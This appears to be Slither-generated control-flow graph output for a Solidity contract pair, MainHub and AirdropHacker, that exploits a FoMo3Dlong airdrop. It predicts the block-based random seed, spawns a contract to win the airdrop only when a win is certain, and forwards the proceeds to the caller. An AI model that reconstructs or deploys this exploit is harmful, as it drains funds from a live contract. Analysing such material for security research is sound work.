digraph G {
// Function: 3919.sol-AirdropHacker-constructor()
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
0->1;
1[label="Node Type: EXPRESSION 1

EXPRESSION:
code.buyXaddr.value(100000000000000000)(0xc6b453D5aa3e23Ce169FD931b1301a03a3b573C5,2)

IRs:
HIGH_LEVEL_CALL, dest:code(FoMo3Dlong), function:buyXaddr, arguments:['1134401609785023636125007683120634713129748886469', '2'] value:100000000000000000 "];
1->2;
2[label="Node Type: EXPRESSION 2

EXPRESSION:
code.withdraw()

IRs:
HIGH_LEVEL_CALL, dest:code(FoMo3Dlong), function:withdraw, arguments:[]  "];
2->3;
3[label="Node Type: EXPRESSION 3

EXPRESSION:
require(bool)(address(this).balance >= 100000000000000000)

IRs:
TMP_56 = CONVERT this to address
TMP_57(uint256) = SOLIDITY_CALL balance(address)(TMP_56)
TMP_58(bool) = TMP_57 >= 100000000000000000
TMP_59(None) = SOLIDITY_CALL require(bool)(TMP_58)"];
3->4;
4[label="Node Type: EXPRESSION 4

EXPRESSION:
selfdestruct(address)(msg.sender)

IRs:
TMP_60(None) = SOLIDITY_CALL selfdestruct(address)(msg.sender)"];
}
// Function: 3919.sol-AirdropHacker-fallback()
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
}
// Function: 3919.sol-AirdropHacker-slitherConstructorVariables()
digraph{
0[label="Node Type: OTHER_ENTRYPOINT 0

EXPRESSION:
code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1)

IRs:
TMP_61 = CONVERT 948434188421984165549453760177959806156913810849 to FoMo3Dlong
code(FoMo3Dlong) := TMP_61(FoMo3Dlong)"];
}
// Function: 3919.sol-FoMo3Dlong-buyXaddr(address,uint256)
digraph{
}
// Function: 3919.sol-FoMo3Dlong-withdraw()
digraph{
}
// Function: 3919.sol-MainHub-airdrop()
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
0->1;
1[label="Node Type: NEW VARIABLE 1

EXPRESSION:
seed = uint256(keccak256()(abi.encodePacked((block.timestamp).add(block.difficulty).add((uint256(keccak256()(abi.encodePacked(block.coinbase)))) / (now)).add(block.gaslimit).add((uint256(keccak256()(abi.encodePacked(msg.sender)))) / (now)).add(block.number))))

IRs:
TMP_23(uint256) = LIBRARY_CALL, dest:SafeMath, function:SafeMath.add(uint256,uint256), arguments:['block.timestamp', 'block.difficulty'] 
TMP_24(bytes) = SOLIDITY_CALL abi.encodePacked()(block.coinbase)
TMP_25(bytes32) = SOLIDITY_CALL keccak256()(TMP_24)
TMP_26 = CONVERT TMP_25 to uint256
TMP_27(uint256) = TMP_26 / now
TMP_28(uint256) = LIBRARY_CALL, dest:SafeMath, function:SafeMath.add(uint256,uint256), arguments:['TMP_23', 'TMP_27'] 
TMP_29(uint256) = LIBRARY_CALL, dest:SafeMath, function:SafeMath.add(uint256,uint256), arguments:['TMP_28', 'block.gaslimit'] 
TMP_30(bytes) = SOLIDITY_CALL abi.encodePacked()(msg.sender)
TMP_31(bytes32) = SOLIDITY_CALL keccak256()(TMP_30)
TMP_32 = CONVERT TMP_31 to uint256
TMP_33(uint256) = TMP_32 / now
TMP_34(uint256) = LIBRARY_CALL, dest:SafeMath, function:SafeMath.add(uint256,uint256), arguments:['TMP_29', 'TMP_33'] 
TMP_35(uint256) = LIBRARY_CALL, dest:SafeMath, function:SafeMath.add(uint256,uint256), arguments:['TMP_34', 'block.number'] 
TMP_36(bytes) = SOLIDITY_CALL abi.encodePacked()(TMP_35)
TMP_37(bytes32) = SOLIDITY_CALL keccak256()(TMP_36)
TMP_38 = CONVERT TMP_37 to uint256
seed(uint256) := TMP_38(uint256)"];
1->2;
2[label="Node Type: IF 2

EXPRESSION:
(seed - ((seed / 1000) * 1000)) < code.airDropTracker_()

IRs:
TMP_39(uint256) = seed / 1000
TMP_40(uint256) = TMP_39 * 1000
TMP_41(uint256) = seed - TMP_40
TMP_42(uint256) = HIGH_LEVEL_CALL, dest:code(FoMo3Dlong), function:airDropTracker_, arguments:[]  
TMP_43(bool) = TMP_41 < TMP_42
CONDITION TMP_43"];
2->3[label="True"];
2->4[label="False"];
3[label="Node Type: RETURN 3

EXPRESSION:
(true)

IRs:
RETURN True"];
4[label="Node Type: RETURN 4

EXPRESSION:
(false)

IRs:
RETURN False"];
}
// Function: 3919.sol-MainHub-attack()
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
0->9;
1[label="Node Type: EXPRESSION 1

EXPRESSION:
require(bool)(code.airDropPot_() >= 500000000000000000)

IRs:
TMP_2(uint256) = HIGH_LEVEL_CALL, dest:code(FoMo3Dlong), function:airDropPot_, arguments:[]  
TMP_3(bool) = TMP_2 >= 500000000000000000
TMP_4(None) = SOLIDITY_CALL require(bool)(TMP_3)"];
1->2;
2[label="Node Type: EXPRESSION 2

EXPRESSION:
require(bool)(airdrop())

IRs:
TMP_5(bool) = INTERNAL_CALL, MainHub.airdrop()()
TMP_6(None) = SOLIDITY_CALL require(bool)(TMP_5)"];
2->3;
3[label="Node Type: NEW VARIABLE 3

EXPRESSION:
initialBalance = address(this).balance

IRs:
TMP_7 = CONVERT this to address
TMP_8(uint256) = SOLIDITY_CALL balance(address)(TMP_7)
initialBalance(uint256) := TMP_8(uint256)"];
3->4;
4[label="Node Type: EXPRESSION 4

EXPRESSION:
(new AirdropHacker).value(100000000000000000)()

IRs:
TMP_11(AirdropHacker) = new AirdropHacker() value:100000000000000000 "];
4->5;
5[label="Node Type: NEW VARIABLE 5

EXPRESSION:
postBalance = address(this).balance

IRs:
TMP_12 = CONVERT this to address
TMP_13(uint256) = SOLIDITY_CALL balance(address)(TMP_12)
postBalance(uint256) := TMP_13(uint256)"];
5->6;
6[label="Node Type: NEW VARIABLE 6

EXPRESSION:
takenAmount = postBalance - initialBalance

IRs:
TMP_14(uint256) = postBalance - initialBalance
takenAmount(uint256) := TMP_14(uint256)"];
6->7;
7[label="Node Type: EXPRESSION 7

EXPRESSION:
msg.sender.transfer(takenAmount * 95 / 100)

IRs:
TMP_15(uint256) = takenAmount * 95
TMP_16(uint256) = TMP_15 / 100
Transfer dest:msg.sender value:TMP_16"];
7->8;
8[label="Node Type: EXPRESSION 8

EXPRESSION:
require(bool)(address(this).balance >= 100000000000000000)

IRs:
TMP_18 = CONVERT this to address
TMP_19(uint256) = SOLIDITY_CALL balance(address)(TMP_18)
TMP_20(bool) = TMP_19 >= 100000000000000000
TMP_21(None) = SOLIDITY_CALL require(bool)(TMP_20)"];
9[label="Node Type: EXPRESSION 9

EXPRESSION:
onlyNotClosed()

IRs:
MODIFIER_CALL, MainHub.onlyNotClosed()()"];
9->1;
}
// Function: 3919.sol-MainHub-constructor()
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
0->1;
1[label="Node Type: EXPRESSION 1

EXPRESSION:
require(bool)(msg.value == 100000000000000000)

IRs:
TMP_0(bool) = msg.value == 100000000000000000
TMP_1(None) = SOLIDITY_CALL require(bool)(TMP_0)"];
1->2;
2[label="Node Type: EXPRESSION 2

EXPRESSION:
owner = msg.sender

IRs:
owner(address) := msg.sender(address)"];
}
// Function: 3919.sol-MainHub-drain()
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
0->3;
1[label="Node Type: EXPRESSION 1

EXPRESSION:
closed = true

IRs:
closed(bool) := True(bool)"];
1->2;
2[label="Node Type: EXPRESSION 2

EXPRESSION:
owner.transfer(address(this).balance)

IRs:
TMP_44 = CONVERT this to address
TMP_45(uint256) = SOLIDITY_CALL balance(address)(TMP_44)
Transfer dest:owner value:TMP_45"];
3[label="Node Type: EXPRESSION 3

EXPRESSION:
onlyOwner()

IRs:
MODIFIER_CALL, MainHub.onlyOwner()()"];
3->1;
}
// Function: 3919.sol-MainHub-fallback()
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
}
// Function: 3919.sol-MainHub-onlyNotClosed()
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
0->1;
1[label="Node Type: EXPRESSION 1

EXPRESSION:
require(bool)(! closed)

IRs:
TMP_51 = UnaryType.BANG closed 
TMP_52(None) = SOLIDITY_CALL require(bool)(TMP_51)"];
1->2;
2[label="Node Type: _ 2
"];
}
// Function: 3919.sol-MainHub-onlyOwner()
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
0->1;
1[label="Node Type: EXPRESSION 1

EXPRESSION:
require(bool)(msg.sender == owner)

IRs:
TMP_49(bool) = msg.sender == owner
TMP_50(None) = SOLIDITY_CALL require(bool)(TMP_49)"];
1->2;
2[label="Node Type: _ 2
"];
}
// Function: 3919.sol-MainHub-slitherConstructorVariables()
digraph{
0[label="Node Type: OTHER_ENTRYPOINT 0

EXPRESSION:
closed = false

IRs:
closed(bool) := False(bool)"];
0->1;
1[label="Node Type: OTHER_ENTRYPOINT 1

EXPRESSION:
code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1)

IRs:
TMP_48 = CONVERT 948434188421984165549453760177959806156913810849 to FoMo3Dlong
code(FoMo3Dlong) := TMP_48(FoMo3Dlong)"];
}
// Function: 3919.sol-SafeMath-add(uint256,uint256)
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
0->1;
1[label="Node Type: EXPRESSION 1

EXPRESSION:
c = a + b

IRs:
TMP_65(uint256) = a + b
c(uint256) := TMP_65(uint256)"];
1->2;
2[label="Node Type: EXPRESSION 2

EXPRESSION:
require(bool,string)(c >= a,SafeMath add failed)

IRs:
TMP_66(bool) = c >= a
TMP_67(None) = SOLIDITY_CALL require(bool,string)(TMP_66,SafeMath add failed)"];
2->3;
3[label="Node Type: RETURN 3

EXPRESSION:
c

IRs:
RETURN c"];
4[label="Node Type: RETURN 4

EXPRESSION:
c

IRs:
RETURN c"];
}
// Function: 3919.sol-SafeMath-sub(uint256,uint256)
digraph{
0[label="Node Type: ENTRY_POINT 0
"];
0->1;
1[label="Node Type: EXPRESSION 1

EXPRESSION:
require(bool,string)(b <= a,SafeMath sub failed)

IRs:
TMP_62(bool) = b <= a
TMP_63(None) = SOLIDITY_CALL require(bool,string)(TMP_62,SafeMath sub failed)"];
1->2;
2[label="Node Type: RETURN 2

EXPRESSION:
a - b

IRs:
TMP_64(uint256) = a - b
RETURN TMP_64"];
}
}
